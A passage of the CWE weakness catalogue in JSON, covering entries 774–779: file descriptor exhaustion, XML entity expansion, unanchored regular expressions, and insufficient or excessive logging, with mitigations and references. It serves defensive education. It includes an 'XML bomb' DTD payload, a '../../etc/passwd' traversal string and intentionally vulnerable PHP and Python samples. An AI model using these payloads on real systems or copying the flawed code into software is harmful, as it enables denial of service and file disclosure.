        }
      ],
      "PotentialMitigations": [
        {
          "MitigationID": "MIT-47",
          "Phase": [
            "Operation",
            "Architecture and Design"
          ],
          "Strategy": "Resource Limitation",
          "Description": "\n\nUse resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.\n\n\nWhen the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.\n\n\nEnsure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).\n"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "FIO42-C",
          "EntryName": "Close files when they are no longer needed",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP14",
          "EntryName": "Failure to Release Resource"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "774",
      "Name": "Allocation of File Descriptors or Handles Without Limits or Throttling",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product allocates file descriptors or handles on behalf of an actor without imposing any restrictions on how many descriptors can be allocated, in violation of the intended security policy for that actor.",
      "ExtendedDescription": "This can cause the product to consume all available file descriptors or handles, which can prevent other processes from performing critical file processing operations.",
      "LikelihoodOfExploit": "Low",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "770",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "File Descriptor Exhaustion"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (Other)"
          ],
          "Note": "When allocating resources without limits, an attacker could prevent all other processes from accessing the same type of resource."
        }
      ],
      "PotentialMitigations": [
        {
          "MitigationID": "MIT-47",
          "Phase": [
            "Operation",
            "Architecture and Design"
          ],
          "Strategy": "Resource Limitation",
          "Description": "\n\nUse resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.\n\n\nWhen the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.\n\n\nEnsure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).\n"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP13",
          "EntryName": "Unrestricted Consumption"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 10, \"Resource Limits\", Page 574",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "775",
      "Name": "Missing Release of File Descriptor or Handle after Effective Lifetime",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not release a file descriptor or handle after its effective lifetime has ended, i.e., after the file descriptor/handle is no longer needed.",
      "ExtendedDescription": "When a file descriptor or handle is not released after use (typically by explicitly closing it), attackers can cause a denial of service by consuming all available file descriptors/handles, or otherwise preventing other system processes from obtaining their own file descriptors/handles.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "772",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "404",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "404",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (Other)"
          ],
          "Note": "An attacker that can influence the allocation of resources that are not properly released could deplete the available resource pool and prevent all other processes from accessing the same type of resource."
        }
      ],
      "PotentialMitigations": [
        {
          "MitigationID": "MIT-47",
          "Phase": [
            "Operation",
            "Architecture and Design"
          ],
          "Strategy": "Resource Limitation",
          "Description": "\n\nUse resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.\n\n\nWhen the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.\n\n\nEnsure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).\n"
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2007-0897",
          "Description": "Chain: anti-virus product encounters a malformed file but returns from a function without closing a file descriptor (CWE-775) leading to file descriptor consumption (CWE-400) and failed scans.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0897"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "FIO42-C",
          "EntryName": "Close files when they are no longer needed",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP14",
          "EntryName": "Failure to Release Resource"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 10, \"File Descriptor Leaks\", Page 582",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "776",
      "Name": "Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion')",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product uses XML documents and allows their structure to be defined with a Document Type Definition (DTD), but it does not properly control the number of recursive definitions of entities.",
      "ExtendedDescription": "If the DTD contains a large number of nested or recursive entities, this can lead to explosive growth of data when parsed, causing a denial of service.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "674",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "674",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "405",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "XML",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "XEE",
          "Description": "XEE is the acronym commonly used for XML Entity Expansion."
        },
        {
          "Term": "Billion Laughs Attack"
        },
        {
          "Term": "XML Bomb",
          "Description": "While the \"XML Bomb\" term was used in the early years of knowledge of this issue, the XEE term seems to be more commonly used."
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (Other)"
          ],
          "Note": "If parsed, recursive entity references allow the attacker to expand data exponentially, quickly consuming all system resources."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Operation"
          ],
          "Description": "If possible, prohibit the use of DTDs or use an XML parser that limits the expansion of recursive DTD entities."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Before parsing XML files with associated DTDs, scan for recursive entity declarations and do not continue parsing potentially explosive content."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-53",
          "Entries": [
            {
              "IntroText": "The DTD and the very brief XML below illustrate what is meant by an XML bomb. The ZERO entity contains one character, the letter A. The choice of entity name ZERO is being used to indicate length equivalent to that exponent on two, that is, the length of ZERO is 2^0. Similarly, ONE refers to ZERO twice, therefore the XML parser will expand ONE to a length of 2, or 2^1. Ultimately, we reach entity THIRTYTWO, which will expand to 2^32 characters in length, or 4 GB, probably consuming far more data than expected."
            },
            {
              "Nature": "Attack",
              "Language": "XML",
              "ExampleCode": "```\n\t<?xml version=\"1.0\"?>\n\t<!DOCTYPE MaliciousDTD [\n\t<!ENTITY ZERO \"A\">\n\t<!ENTITY ONE \"&ZERO;&ZERO;\">\n\t<!ENTITY TWO \"&ONE;&ONE;\">\n\t...\n\t<!ENTITY THIRTYTWO \"&THIRTYONE;&THIRTYONE;\">\n\t]>\n\t<data>&THIRTYTWO;</data>\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2008-3281",
          "Description": "XEE in XML-parsing library.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3281"
        },
        {
          "Reference": "CVE-2011-3288",
          "Description": "XML bomb / XEE in enterprise communication product.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-3288"
        },
        {
          "Reference": "CVE-2011-1755",
          "Description": "\"Billion laughs\" attack in XMPP server daemon.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-1755"
        },
        {
          "Reference": "CVE-2009-1955",
          "Description": "XML bomb in web server module",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1955"
        },
        {
          "Reference": "CVE-2003-1564",
          "Description": "Parsing library allows XML bomb",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2003-1564"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "WASC",
          "EntryID": "44",
          "EntryName": "XML Entity Expansion"
        }
      ],
      "RelatedAttackPatterns": [
        "197"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-676",
          "Authors": [
            "Amit Klein"
          ],
          "Title": "Multiple vendors XML parser (and SOAP/WebServices server) Denial of Service attack using DTD",
          "PublicationYear": "2002",
          "PublicationMonth": "12",
          "PublicationDay": "16",
          "URL": "https://seclists.org/fulldisclosure/2002/Dec/229",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-677",
          "Authors": [
            "Rami Jaamour"
          ],
          "Title": "XML security: Preventing XML bombs",
          "PublicationYear": "2006",
          "PublicationMonth": "02",
          "PublicationDay": "22",
          "URL": "http://searchsoftwarequality.techtarget.com/expert/KnowledgebaseAnswer/0,289625,sid92_gci1168442,00.html?asrc=SS_CLA_302%20%20558&psrc=CLT_92#"
        },
        {
          "ExternalReferenceID": "REF-678",
          "Authors": [
            "Didier Stevens"
          ],
          "Title": "Dismantling an XML-Bomb",
          "PublicationYear": "2008",
          "PublicationMonth": "09",
          "PublicationDay": "23",
          "URL": "https://blog.didierstevens.com/2008/09/23/dismantling-an-xml-bomb/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-679",
          "Authors": [
            "Robert Auger"
          ],
          "Title": "XML Entity Expansion",
          "URL": "http://projects.webappsec.org/w/page/13247002/XML%20Entity%20Expansion",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-680",
          "Authors": [
            "Elliotte Rusty Harold"
          ],
          "Title": "Tip: Configure SAX parsers for secure processing",
          "PublicationYear": "2005",
          "PublicationMonth": "05",
          "PublicationDay": "27",
          "URL": "https://web.archive.org/web/20101005080451/http://www.ibm.com/developerworks/xml/library/x-tipcfsx.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-500",
          "Authors": [
            "Bryan Sullivan"
          ],
          "Title": "XML Denial of Service Attacks and Defenses",
          "PublicationYear": "2009",
          "PublicationMonth": "09",
          "URL": "https://learn.microsoft.com/en-us/archive/msdn-magazine/2009/november/xml-denial-of-service-attacks-and-defenses",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-682",
          "Authors": [
            "Blaise Doughan"
          ],
          "Title": "Preventing Entity Expansion Attacks in JAXB",
          "PublicationYear": "2011",
          "PublicationMonth": "03",
          "PublicationDay": "11",
          "URL": "http://blog.bdoughan.com/2011/03/preventing-entity-expansion-attacks-in.html",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "777",
      "Name": "Regular Expression without Anchors",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a regular expression to perform neutralization, but the regular expression is not anchored and may allow malicious or malformed data to slip through.",
      "ExtendedDescription": "When performing tasks such as validating against a set of allowed inputs (allowlist), data is examined and possibly modified to ensure that it is well-formed and adheres to a list of safe values. If the regular expression is not anchored, malicious or malformed data may be included before or after any string matching the regular expression. The type of malicious data that is allowed will depend on the context of the application and which anchors are omitted from the regular expression.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "625",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "BackgroundDetails": [
        "Regular expressions are typically used to match a pattern of text. Anchors are used in regular expressions to specify where the pattern should match: at the beginning, the end, or both (the whole input)."
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability",
            "Confidentiality",
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ],
          "Note": "An unanchored regular expression in the context of an allowlist will possibly result in a protection mechanism failure, allowing malicious or malformed data to enter trusted regions of the program. The specific consequences will depend on what functionality the allowlist was protecting."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Be sure to understand both what will be matched and what will not be matched by a regular expression. Anchoring the ends of the expression will allow the programmer to define an allowlist strictly limited to what is matched by the text in the regular expression. If you are using a package that only matches one line by default, ensure that you can match multi-line inputs if necessary."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "Consider a web application that supports multiple languages. It selects messages for an appropriate language by using the lang parameter."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t$dir = \"/home/cwe/languages\";\n\t$lang = $_GET['lang'];\n\tif (preg_match(\"/[A-Za-z0-9]+/\", $lang)) {\n\t\tinclude(\"$dir/$lang\");\n\t}\n\telse {\n\t\techo \"You shall not pass!\\n\";\n\t}\n```"
            },
            {
              "BodyText": "The previous code attempts to match only alphanumeric values so that language values such as \"english\" and \"french\" are valid while also protecting against path traversal, CWE-22. However, the regular expression anchors are omitted, so any text containing at least one alphanumeric character will now pass the validation step. For example, the attack string below will match the regular expression."
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\t../../etc/passwd\n```"
            },
            {
              "BodyText": "If the attacker can inject code sequences into a file, such as the web server's HTTP request log, then the attacker may be able to redirect the lang parameter to the log file and execute arbitrary code."
            }
          ]
        },
        {
          "ID": "DX-154",
          "Entries": [
            {
              "IntroText": "This code uses a regular expression to validate an IP string prior to using it in a call to the \"ping\" command."
            },
            {
              "Nature": "Bad",
              "Language": "Python",
              "ExampleCode": "```\n\t import subprocess\n\t import re\n\t def validate_ip_regex(ip: str):\n\t\t ip_validator = re.compile(r\"((25[0-5]|(2[0-4]|1\\d|[1-9]|)\\d)\\.?\\b){4}\")\n\t\t if ip_validator.match(ip):\n\t\t\t return ip\n\t\t else:\n\t\t\t raise ValueError(\"IP address does not match valid pattern.\")\n\t def run_ping_regex(ip: str):\n\t\t validated = validate_ip_regex(ip)\n```\n# The ping command treats zero-prepended IP addresses as octal* \n\t\t result = subprocess.call([\"ping\", validated])\n\t\t print(result)"
            },
            {
              "BodyText": "Since the regular expression does not have anchors (CWE-777), i.e. is unbounded without ^ or $ characters, then prepending a 0 or 0x to the beginning of the IP address will still result in a matched regex pattern. Since the ping command supports octal and hex prepended IP addresses, it will use the unexpectedly valid IP address (CWE-1389). For example, \"0x63.63.63.63\" would be considered equivalent to \"99.63.63.63\". As a result, the attacker could potentially ping systems that the attacker cannot reach directly."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-30034",
          "Description": "Chain: Web UI for a Python RPC framework does not use regex anchors to validate user login emails (CWE-777), potentially allowing bypass of OAuth (CWE-1390).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-30034"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "778",
      "Name": "Insufficient Logging",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "When a security-critical event occurs, the product either does not record the event or omits important details about the event when logging it.",
      "ExtendedDescription": "\n\nWhen security-critical events are not logged properly, such as a failed login attempt, this can make malicious behavior more difficult to detect and may hinder forensic analysis after an attack succeeds.\n\n\nAs organizations adopt cloud storage resources, these technologies often require configuration changes to enable detailed logging information, since detailed logging can incur additional costs. This could lead to telemetry gaps in critical audit logs. For example, in Azure, the default value for logging is disabled. \n",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "223",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "693",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Cloud Computing",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Operation",
          "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Non-Repudiation"
          ],
          "Impact": [
            "Hide Activities"
          ],
          "Note": "If security critical information is not recorded, there will be no trail for forensic analysis and discovering the cause of problems or the source of attacks may become more difficult or impossible."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use a centralized logging mechanism that supports multiple levels of detail."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Ensure that all security-related successes and failures can be logged. When storing data in the cloud (e.g., AWS S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to enable and capture detailed logging information."
        },
        {
          "Phase": [
            "Operation"
          ],
          "Description": "Be sure to set the level of logging appropriately in a production environment. Sufficient data should be logged to enable system administrators to detect attacks, diagnose errors, and recover from attacks. At the same time, logging too much data (CWE-779) can cause the same problems, including unexpected costs when using a cloud environment."
        },
        {
          "Phase": [
            "Operation"
          ],
          "Description": "To enable storage logging using Azure's Portal, navigate to the name of the Storage Account, locate Monitoring (CLASSIC) section, and select Diagnostic settings (classic). For each of the various properties (blob, file, table, queue), ensure the status is properly set for the desired logging data. If using PowerShell, the Set-AzStorageServiceLoggingProperty command could be called using appropriate -ServiceType, -LoggingOperations, and -RetentionDays arguments."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The example below shows a configuration for the service security audit feature in the Windows Communication Foundation (WCF)."
            },
            {
              "Nature": "Bad",
              "Language": "XML",
              "ExampleCode": "```\n\t<system.serviceModel>\n\t\t<behaviors>\n\t\t\t<serviceBehaviors>\n\t\t\t\t<behavior name=\"NewBehavior\">\n\t\t\t\t\t<serviceSecurityAudit auditLogLocation=\"Default\"\n\t\t\t\t\tsuppressAuditFailure=\"false\"\n\t\t\t\t\tserviceAuthorizationAuditLevel=\"None\"\n\t\t\t\t\tmessageAuthenticationAuditLevel=\"None\" />\n\t\t\t\t...\n\t</system.serviceModel>\n```"
            },
            {
              "BodyText": "The previous configuration file has effectively disabled the recording of security-critical events, which would force the administrator to look to other sources during debug or recovery efforts."
            },
            {
              "BodyText": "Logging failed authentication attempts can warn administrators of potential brute force attacks. Similarly, logging successful authentication events can provide a useful audit trail when a legitimate account is compromised. The following configuration shows appropriate settings, assuming that the site does not have excessive traffic, which could fill the logs if there are a large number of success or failure events (CWE-779)."
            },
            {
              "Nature": "Good",
              "Language": "XML",
              "ExampleCode": "```\n\t<system.serviceModel>\n\t\t<behaviors>\n\t\t\t<serviceBehaviors>\n\t\t\t\t<behavior name=\"NewBehavior\">\n\t\t\t\t\t<serviceSecurityAudit auditLogLocation=\"Default\"\n\t\t\t\t\tsuppressAuditFailure=\"false\"\n\t\t\t\t\tserviceAuthorizationAuditLevel=\"SuccessAndFailure\"\n\t\t\t\t\tmessageAuthenticationAuditLevel=\"SuccessAndFailure\" />\n\t\t\t\t ...\n\t</system.serviceModel>\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the following Java example the code attempts to authenticate the user. If the login fails a retry is made. Proper restrictions on the number of login attempts are of course part of the retry functionality. Unfortunately, the failed login is not recorded and there would be no record of an adversary attempting to brute force the program."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tif LoginUser(){ \n\t\t// Login successful\n\t\t RunProgram();\n\t } else { \n\t\t// Login unsuccessful\n\t\t LoginRetry();\n\t }\n```"
            },
            {
              "BodyText": "It is recommended to log the failed login action. Note that unneutralized usernames should not be part of the log message, and passwords should never be part of the log message."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tif LoginUser(){ \n\t\t// Login successful\n\t\t log.warn(\"Login by user successful.\");\n\t\t RunProgram();\n\t } else { \n\t\t // Login unsuccessful\n\t\t log.warn(\"Login attempt by user failed, trying again.\");\n\t\t LoginRetry();\n\t }\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "Consider this command for updating Azure's Storage Logging for Blob service, adapted from [REF-1307]:"
            },
            {
              "Nature": "Bad",
              "Language": "Shell",
              "ExampleCode": "```\n\taz storage logging update --account-name --account-key --services b --log d --retention 90\n```"
            },
            {
              "BodyText": "The \"--log d\" portion of the command says to log deletes. However, the argument does not include the logging of writes and reads. Adding the \"rw\" arguments to the -log parameter will fix the issue:"
            },
            {
              "Nature": "Good",
              "Language": "Shell",
              "ExampleCode": "```\n\taz storage logging update --account-name --account-key --services b --log rwd --retention 90\n```"
            },
            {
              "BodyText": "To enable Azure's storage analytic logs programmatically using PowerShell:"
            },
            {
              "Nature": "Good",
              "Language": "Shell",
              "ExampleCode": "```\n\tSet-AzStorageServiceLoggingProperty -ServiceType Queue -LoggingOperations read,write,delete -RetentionDays 5 -Context $MyContextObject\n```"
            },
            {
              "BodyText": "Notice that here, the retention has been limited to 5 days."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2008-4315",
          "Description": "server does not log failed authentication attempts, making it easier for attackers to perform brute force password guessing without being detected",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4315"
        },
        {
          "Reference": "CVE-2008-1203",
          "Description": "admin interface does not log failed authentication attempts, making it easier for attackers to perform brute force password guessing without being detected",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1203"
        },
        {
          "Reference": "CVE-2007-3730",
          "Description": "default configuration for POP server does not log source IP or username for login attempts",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-3730"
        },
        {
          "Reference": "CVE-2007-1225",
          "Description": "proxy does not log requests without \"http://\" in the URL, allowing web surfers to access restricted web content without detection",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1225"
        },
        {
          "Reference": "CVE-2003-1566",
          "Description": "web server does not log requests for a non-standard request type",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2003-1566"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 2, \"Accountability\", Page 40",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        },
        {
          "ExternalReferenceID": "REF-1307",
          "Section": "Sections 3.5, 3.13, and 3.14",
          "Authors": [
            "Center for Internet Security"
          ],
          "Title": "CIS Microsoft Azure Foundations Benchmark version 1.5.0",
          "PublicationYear": "2022",
          "PublicationMonth": "08",
          "PublicationDay": "16",
          "URL": "https://www.cisecurity.org/benchmark/azure",
          "URLDate": "2023-01-19"
        },
        {
          "ExternalReferenceID": "REF-1308",
          "Authors": [
            "Microsoft"
          ],
          "Title": "Enable and manage Azure Storage Analytics logs (classic)",
          "PublicationYear": "2023",
          "PublicationMonth": "01",
          "PublicationDay": "23",
          "URL": "https://learn.microsoft.com/en-us/azure/storage/common/manage-storage-analytics-logs",
          "URLDate": "2023-01-24"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "779",
      "Name": "Logging of Excessive Data",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product logs too much information, making log files hard to process and possibly hindering recovery efforts or forensic analysis after an attack.",
      "ExtendedDescription": "While logging is a good practice in general, and very high levels of logging are appropriate for debugging stages of development, too much logging in a production environment might hinder a system administrator's ability to detect anomalous conditions. This can provide cover for an attacker while attempting to penetrate a system, clutter the audit trail for forensic analysis, or make it more difficult to debug problems in a production environment.",
      "LikelihoodOfExploit": "Low",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "400",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Operation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (CPU)",
            "DoS: Resource Consumption (Other)"
          ],
          "Note": "Log files can become so large that they consume excessive resources, such as disk and CPU, which can hinder the performance of the system."
        },
        {
          "Scope": [
            "Non-Repudiation"
          ],
          "Impact": [
            "Hide Activities"
          ],
          "Note": "Logging too much information can make the log files of less use to forensics analysts and developers when trying to diagnose a problem or recover from an attack."
        },
        {
          "Scope": [
            "Non-Repudiation"
          ],
          "Impact": [
            "Hide Activities"
          ],
          "Note": "If system administrators are unable to effectively process log files, attempted attacks may go undetected, possibly leading to eventual system compromise."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Suppress large numbers of duplicate log messages and replace them with periodic summaries. For example, syslog may include an entry that states \"last message repeated X times\" when recording repeated events."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
